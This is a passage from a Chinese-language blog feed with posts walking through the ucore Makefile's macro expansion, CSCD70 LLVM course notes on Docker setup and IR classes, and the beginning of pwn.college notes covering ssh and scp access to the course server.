class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(4))))<br>ende<br></code></pre></div></td></tr></table></figure><p>表示将传入的文件列表中的每一个文件都使用cc_template进行生成编译模板；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add files to packet: (#files, cc[, flags, packet, dir])</span><br><span class="hljs-keyword">define</span> do_add_files_to_packet<br>__temp_packet__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> packetname,$(4)</span>)<br><span class="hljs-keyword">ifeq</span> ($<span class="hljs-variable">$(<span class="hljs-built_in">origin</span> $<span class="hljs-variable">$(__temp_packet__)</span>)</span>,undefined)<br>$<span class="hljs-variable">$(__temp_packet__)</span> :=<br><span class="hljs-keyword">endif</span><br>__temp_objs__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(5))<br>$<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(5))))<br>$<span class="hljs-variable">$(__temp_packet__)</span> += $<span class="hljs-variable">$(__temp_objs__)</span><br>ende<br></code></pre></div></td></tr></table></figure><p>上述代码中，首先使用call packetname生成出某一个packetname对应的makefile中变量的名字，然后使用origin查询这个变量是否已经定义过，如果为定义，则初始化该变量为空；之后使用toobj生成出该packet中所需要的生成的.o文件的文件名列表，然后将其添加到以__temp_packet__这个变量中所存的值作为名字的变量中去，并且使用cc_template生成出该packet生成.d文件和.o文件的代码；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add objs to packet: (#objs, packet)</span><br><span class="hljs-keyword">define</span> do_add_objs_to_packet<br>__temp_packet__ := <span class="hljs-variable">$(<span class="hljs-built_in">call</span> packetname,$(2)</span>)<br><span class="hljs-keyword">ifeq</span> ($<span class="hljs-variable">$(<span class="hljs-built_in">origin</span> $<span class="hljs-variable">$(__temp_packet__)</span>)</span>,undefined)<br>$<span class="hljs-variable">$(__temp_packet__)</span> :=<br><span class="hljs-keyword">endif</span><br>$<span class="hljs-variable">$(__temp_packet__)</span> += $(1)<br>ende<br></code></pre></div></td></tr></table></figure><p>上述代码表示将某一个.o文件添加到某一个packet对应的makefile中的变量中的文件列表中去；举例，如果要添加a.o到pack这一个packet中，则结果就是__objs_这个变量会执行__objs_pack += a.o这个一个操作；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># add packets and objs to target (target, #packes, #objs[, cc, flags])</span><br><span class="hljs-keyword">define</span> do_create_target<br>__temp_target__ = <span class="hljs-variable">$(<span class="hljs-built_in">call</span> totarget,$(1)</span>)<br>__temp_objs__ = $<span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> p,$(<span class="hljs-built_in">call</span> packetname,$(2)</span>),$$($<span class="hljs-variable">$(p)</span>)) $(3)<br>TARGETS += $<span class="hljs-variable">$(__temp_target__)</span><br><span class="hljs-keyword">ifneq</span> ($(4),)<br><span class="hljs-section">$$(__temp_target__): $<span class="hljs-variable">$(__temp_objs__)</span> | $$$$(dir $$$<span class="hljs-variable">$@</span>)</span><br>    <span class="hljs-variable">$(V)</span>$(4) $(5) $<span class="hljs-variable">$^</span> -o $<span class="hljs-variable">$@</span><br><span class="hljs-keyword">else</span><br><span class="hljs-section">$$(__temp_target__): $<span class="hljs-variable">$(__temp_objs__)</span> | $$$$(dir $$$<span class="hljs-variable">$@</span>)</span><br><span class="hljs-keyword">endif</span><br>ende<br></code></pre></div></td></tr></table></figure><p>上述代码表示将第一个参数传入的binary targets和第三个参数传入的object文件均添加到TARGETS变量中去，之后根据第4个参数是否传入gcc编译命令来确定是否生成编译的规则；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># finish all</span><br><span class="hljs-keyword">define</span> do_finish_all<br>ALLDEPS = $$(ALLOBJS:.o=.d)<br>$<span class="hljs-variable">$(<span class="hljs-built_in">sort</span> $$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$(ALLOBJS)</span>)</span> <span class="hljs-variable">$(BINDIR)</span><span class="hljs-variable">$(SLASH)</span> <span class="hljs-variable">$(OBJDIR)</span><span class="hljs-variable">$(SLASH)</span>):<br>    @<span class="hljs-variable">$(MKDIR)</span> $<span class="hljs-variable">$@</span><br>ende<br></code></pre></div></td></tr></table></figure><p>创建编译过程中所需要的子目录；</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment"># --------------------  function end  --------------------</span><br><span class="hljs-comment"># compile file: (#files, cc[, flags, dir])</span><br>cc_compile = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_cc_compile,$(1)</span>,$(2),$(3),$(4)))<br><br><span class="hljs-comment"># add files to packet: (#files, cc[, flags, packet, dir])</span><br>add_files = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_add_files_to_packet,$(1)</span>,$(2),$(3),$(4),$(5)))<br><br><span class="hljs-comment"># add objs to packet: (#objs, packet)</span><br>add_objs = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_add_objs_to_packet,$(1)</span>,$(2)))<br><br><span class="hljs-comment"># add packets and objs to target (target, #packes, #objs, cc, [, flags])</span><br>create_target = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_create_target,$(1)</span>,$(2),$(3),$(4),$(5)))<br><br>read_packet = <span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> p,$(<span class="hljs-built_in">call</span> packetname,$(1)</span>),$(<span class="hljs-variable">$(p)</span>))<br><br>add_dependency = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(1)</span>: $(2))<br><br>finish_all = <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_finish_all)</span><br></code></pre></div></td></tr></table></figure><p>接下来这部分则是使用eval来进一步将原先设计好的编译代码的表达式中的变量替换为变量的数值，从而方便后面生成编译的规则，接下来不妨以cc_compile这个表达式的求值为例，说明Makefile中是如何生成编译规则的：</p><blockquote><p>为了方便起见，不妨假设传入cc_compile这个表达式的四个参数分别为main.c, gcc, -Wall, bin, 则不妨首先计算<code>$(call do_cc_compile,$(1),$(2),$(3),$(4))</code>表达式的数值如下：</p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">cc_compile  <br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> do_cc_compile,$(1)</span>,$(2),$(3),$(4))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">foreach</span> f,$(1)</span>,$<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $$(<span class="hljs-built_in">call</span> cc_template,$<span class="hljs-variable">$(f)</span>,$(2)</span>,$(3),$(4))))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">foreach</span> f, $(1)</span>, <span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> cc_template, <span class="hljs-variable">$(f)</span>, $(2)</span>, $(3), $(4)))))<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">call</span> cc_template, $(1)</span>, $(2), $(3), $(4)))) (since $(1)=main.c)<br>=<span class="hljs-variable">$(<span class="hljs-built_in">eval</span> $(<span class="hljs-built_in">eval</span> </span><br><span class="hljs-variable">$$(<span class="hljs-built_in">call</span> todep,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -MM $<span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$$(patsubst %.d,%.o,$<span class="hljs-variable">$@</span>) $<span class="hljs-variable">$@</span>&quot;</span>&gt; $<span class="hljs-variable">$@</span><br>$<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $$$<span class="hljs-variable">$@</span>)</span><br>    @echo + cc $<span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c $<span class="hljs-variable">$&lt;</span> -o $<span class="hljs-variable">$@</span><br>ALLOBJS += $<span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)<br>))<br>= <span class="hljs-variable">$(<span class="hljs-built_in">eval</span></span><br><span class="hljs-variable">$(<span class="hljs-built_in">call</span> todep, $(1)</span>, $(4))): $(1) | $$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @$(2) -I <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>)  $(3) -MM <span class="hljs-variable">$&lt;</span> -MT <span class="hljs-string">&quot;$(patsubst %.d,%.o,<span class="hljs-variable">$@</span>) <span class="hljs-variable">$@</span>&quot;</span>&gt; <span class="hljs-variable">$@</span><br><span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4)): $(1) | $$<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @echo + cc <span class="hljs-variable">$&lt;</span><br>    <span class="hljs-variable">$(V)</span>$(2) -I<span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(1)</span>) $(3) -c <span class="hljs-variable">$&lt;</span> -o <span class="hljs-variable">$@</span><br>ALLOBJS += <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,$(1)</span>,$(4))<br>)<br>= <span class="hljs-variable">$(<span class="hljs-built_in">eval</span></span><br><span class="hljs-variable">obj/main.d: main.c | $$$(<span class="hljs-built_in">dir</span> $<span class="hljs-variable">$@</span>)</span><br>    @gcc -I./ -Wall -MM main.c -MT <span class="hljs-string">&quot;main.o main.d&quot;</span>&gt; main.d<br><span class="hljs-section">obj/main.o: main.c | $$$(dir $<span class="hljs-variable">$@</span>)</span><br>    @echo + cc main.c<br>    <span class="hljs-variable">$(V)</span>gcc -I./ -Wall -c main.c -o main.o<br>)<br><span class="hljs-comment"># 注意到还有一次expansion, 是因为 .SECONDEXPANSION: 这个built-in target</span><br>=<br><span class="hljs-section">obj/main.d: main.c | obj</span><br>    @gcc -I./ -Wall -MM main.c -MT <span class="hljs-string">&quot;main.o main.d&quot;</span>&gt; main.d <br><span class="hljs-section">obj/main.o: main.c | obj</span><br>    @echo + cc main.c<br>    <span class="hljs-variable">$(V)</span>gcc -I./ -Wall -c main.c -o main.o<br></code></pre></div></td></tr></table></figure><p>至此通过例子演示了如果使用Makefile来生成一系列编译规则，如果使用<code>make --trace</code>(所有输出)或者<code>make -n</code>(Don’t actually run any recipe; just print them.)，可以发现生成obj/boot/bootasm.d, obj/boot/bootasm.o的实际执行的命令为</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -MM boot/bootmain.c -MT &quot;obj/boot/bootmain.o obj/boot/bootmain.d&quot;&gt; obj/boot/bootmain.d<br>和:<br>gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o<br></code></pre></div></td></tr></table></figure><p>，与上述例子中展开的结果进行对比，可以确认该分析过程的正确性；</p><ul><li>其余Makefile命令均用于生成<code>.PHONY</code>目标来完成clean，grade等一系列功能，与具体生成ucore.img过程无关，因此在本报告中将不太对其进行分析；</li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSCD70 &amp;&amp; LLVM</title>
    <link href="/2022-03/Now-CSCD70/"/>
    <url>/2022-03/Now-CSCD70/</url>
    
    <content type="html"><![CDATA[<h1 id="docker相关"><a href="#docker相关" class="headerlink" title="docker相关"></a>docker相关</h1><blockquote><p>docker原理待看, 主要是chroot+namespace的使用, 所以只能在linux中运行. Windows必须装上WSL.</p></blockquote><ul><li>开启container</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd ~/Desktop/CSCD70/<br>sudo docker run -it -v $(pwd):/mnt --rm --name cscd70_a1 cscd70:2021S<br></code></pre></div></td></tr></table></figure><ul><li>多开container: </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo docker exec -it <br>sudo docker exec -it &#123;container_ID&#125; /bin/bash <br><span class="hljs-meta">#</span><span class="bash"> 一长串的是container ID, 可以直接看容器用户名, 或者使用`sudo docker ps`</span><br></code></pre></div></td></tr></table></figure><ul><li>具体创建方法在Assignment0里面, 我还为此换了个阿里源… 下面是dockerfile新加上的部分.</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="bash"> mv /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse&quot;</span> &gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br></code></pre></div></td></tr></table></figure><h1 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h1><h2 id="CLI-Guide"><a href="#CLI-Guide" class="headerlink" title="CLI Guide"></a>CLI Guide</h2><ul><li>-load: load additional library    -{pass_name}    ./test/Loop.c: <strong>check file(expected)</strong>    stdin of FileCheck: <strong>input file</strong><br>  if correct, nothing will be printed.<br>  需要先在FunctionInfo文件夹执行make.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">opt -load ./FunctionInfo.so -function-info ./test/Loop.bc \<br>-disable-output | FileCheck --check-prefix=SAMPLE ./test/Loop.c<br></code></pre></div></td></tr></table></figure><ul><li><h2 id="class-architecture"><a href="#class-architecture" class="headerlink" title="class architecture"></a>class architecture</h2></li></ul><h3 id="IR所有头文件"><a href="#IR所有头文件" class="headerlink" title="IR所有头文件"></a><a href="https://llvm.org/doxygen/dir_c3e93f23a4a31c717998b98ce143b7c0.html">IR所有头文件</a></h3><h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-value-class">Value</a></h3><p>就和名字一个意思, It represents a typed value that may be used (among other things) as an operand to an instruction. To keep track of this relationship, the <code>Value</code> class keeps a list of all of the <code>User</code>s that is using it( 就是<code>Use *UseList;</code>)</p><p>有一些getType, getValue, use_list_iterator之类的成员函数.</p><img src="../../image/CSCD70/image-20220315181757882.png" alt="image-20220315181757882" style="zoom: 80%;" /><h3 id="BB"><a href="#BB" class="headerlink" title="BB"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-basicblock-class">BB</a></h3><p>没啥好说的. 查就完事了.</p><h3 id="User"><a href="#User" class="headerlink" title="User!!!"></a>User!!!</h3><p>It exposes a list of “Operands” that are all of the <code>Value</code>s that the User is referring to.</p><p>Because LLVM uses <strong>Static Single Assignment (SSA)</strong> form, there can only be one definition referred to, allowing this direct connection. This connection provides the use-def information in LLVM. 真巧, 因为采用了SSA所以实现了一一对应的指针.</p><p>有一些<code>getOperand</code>, <code>getNumOperands</code>之类的函数(显而易见了). 像这种的都会有迭代器.</p><p>派生类包括==Constant, Instruction, Operator==之类的(图片过长).</p><p><strong>几个重要的问题: User为什么继承于Value? User和Use有什么关系?</strong> </p><ul><li><p>第一个问题, 比如说Instruction class(假设是<code>%add1 : x = y + z</code>)继承链为<code>Value&lt;-User&lt;-Instruction</code>, 既有value的definition(x), 也有use(y和z). </p><p><code>replaceAllUsesWith()</code>是Value的method, 替换掉所有引用x的use, 即def-use chain;<br><code>replaceUsesOfWith()</code>是User的method, 替换y, z所指向的value, 即use-def chain(由于SSA所以可以实现一一对应).</p></li><li><p>第二个, LLVM的<a href="https://llvm.org/docs/ProgrammersManual.html#interaction-and-relationship-between-user-and-use-objects">doc</a>和<a href="https://stackoverflow.com/questions/35370195/llvm-difference-between-uses-and-user-in-instruction-or-value-classes">Stack Overflow</a>有相关解释. (Use s will <code>inline</code> or <code>hung off</code>)下面这种情况就是hung off, <code>use**</code>数组通过重写operator new的方式附加在User class前面. 而在Value class中则有<code>Use *UseList;</code> , 所以在User中也有uselist.</p><p>在Use class中, Value和User都作为friend class.</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...---.---.---.---.-------...<br>  | P | P | P | P | User<br><span class="hljs-string">&#x27;&#x27;&#x27;---&#x27;---&#x27;---&#x27;---&#x27;-------&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a><a href="https://llvm.org/doxygen/classllvm_1_1Instruction.html">Instruction</a></h3><p>真的是一堆派生类.</p><p>To represent a specific type of instruction, one of many subclasses of <code>Instruction</code> are used. 真的非常多, 比如说二元运算符和UnaryInstruction(又分成UnaryOperator和LoadInstruction之类的).</p><p>继承图: Value&lt;-User&lt;-Instruction</p><p><strong>写个代码又发现之前看文档没看懂的地方(还是得拿源码出来)</strong> </p><p><code>llvm/Instruction.def</code> file. This file contains some meta-data about <strong>the various different types</strong> of instructions in LLVM. </p><p>在instruction.h中有下面这个enum, 而Instruction.def中是一大串没有实例化的#define, 在enum中实例化所需的操作后include那个文件就可以实现在enum里面通过预处理后显示<code>ADD = 13( OPC = N )</code>了. 不过这种写法doxygen并不能识别出来.</p><p>写成 <code>Instruction::ADD</code> 就可以使用这个枚举变量了.</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BinaryOps</span> &#123;</span><br>  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  FIRST_BINARY_INST(N)             BinaryOpsBegin = N,</span><br>  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HANDLE_BINARY_INST(N, OPC, CLASS) OPC = N,</span><br>  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>   LAST_BINARY_INST(N)             BinaryOpsEnd = N+1</span><br>  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/IR/Instruction.def&quot;</span></span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="Constant"><a href="#Constant" class="headerlink" title="Constant"></a>Constant</h3><p>Constant represents a base class for different types of constants.</p><p>It is subclassed by <strong>ConstantInt</strong>, <strong>ConstantArray</strong>, etc. for representing the various types of Constants. </p><p>成员函数有比如getSExtValue这样的, 还有个getSigned静态成员函数等等.</p><img src="../../image/CSCD70/image-20220317122408594.png" alt="image-20220317122408594" style="zoom:67%;" /><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-function-class">Function</a></h3><img src="../../image/CSCD70/image-20220315185203276.png" alt="image-20220315185203276" style="zoom:67%;" /><h3 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h3><p>Every <code>Value</code> has a <code>Type</code>. 有一个<code>SubClassData</code>可以在派生类中存储数据, 使用<code>Type class</code>中的<code>set~()</code>即可设置.</p><p>有一个我查了挺久的问题: <strong>Function和FunctionType有什么区别?</strong> </p><ul><li>The <code>Function</code> class keeps track of a <strong>list</strong> of <a href="https://llvm.org/docs/ProgrammersManual.html#basicblock">BasicBlock</a>s, a <strong>list</strong> of formal <a href="https://llvm.org/docs/ProgrammersManual.html#argument">Argument</a>s, and a <a href="https://llvm.org/docs/ProgrammersManual.html#symboltable">SymbolTable</a>.<br>有像getArgumentList这样的函数. 基本都是存储一个list的信息.</li><li>而FunctionType的功能就像下面所展示的那样, 存储着编程层面上/一个函数的基本信息. </li></ul><blockquote><p>**FunctionType: ** </p><p>Subclass of DerivedTypes for function types.</p><ul><li><code>bool isVarArg() const</code>: Returns true if it’s a vararg function.</li><li><code>const Type * getReturnType() const</code>: Returns the return type of the function.</li><li><code>const Type * getParamType (unsigned i)</code>: Returns the type of the ith parameter.</li><li><code>const unsigned getNumParams() const</code>: Returns the number of formal parameters.</li></ul></blockquote><img src="../../image/CSCD70/image-20220315183948503.png" alt="image-20220315183948503" style="zoom:67%;" /><h1 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h1><blockquote><p>肖佬博客<a href="https://kiprey.github.io/2020/06/LLVM-IR-pass/#4-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%9A%84%E4%BC%98%E5%8C%96">在此</a>, 即基本概念+LLVM实例.</p></blockquote><h2 id="Assignment1"><a href="#Assignment1" class="headerlink" title="Assignment1"></a>Assignment1</h2><ul><li>(1) Algebraic Identity</li><li>(2) Strength Reduction</li><li>(3) Multi-Instruction Optimization</li></ul><p>经过在文档里的一番倒腾终于会了一些基本操作, <code>dyn_cast</code> <code>replaceAllUsesWith</code> <code>getOperand</code> 这些东西等等.</p><h2 id="Assignment2"><a href="#Assignment2" class="headerlink" title="Assignment2"></a>Assignment2</h2><ul><li>到达-定值分析（Reaching-Definition Analysis)</li><li>活跃变量分析（Live-Variable Analysis)</li><li>可用表达式分析 (Available-Exprssion Analysis)</li><li>SSA ( static single assignment )</li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn modules的一点笔记</title>
    <link href="/2022-01/Now-pwn-modules/"/>
    <url>/2022-01/Now-pwn-modules/</url>
    
    <content type="html"><![CDATA[<ul><li><p>连接</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i ~/pwn.college/pwnkey hacker@dojo.pwn.college <br></code></pre></div></td></tr></table></figure></li><li><p>传文件到dojo或拉取</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i ~/pwn.college/pwnkey [文件] hacker@dojo.pwn.college:<br>scp -i ~/pwn.college/pwnkey hacker@dojo.pwn.college:[文件] ./<br></code></pre></div></td></tr></table></figure></li><li><p><strong>可以创建flag的符号链接, 不过除了$HOME其他目录均不能写, 只能在<code>~/</code>下.</strong> </p></li></ul><h1 id="module-1-communication"><a href="#module-1-communication" class="headerlink" title="module 1-communication"></a>module 1-communication</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" alt="image-20220117165401525"></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path 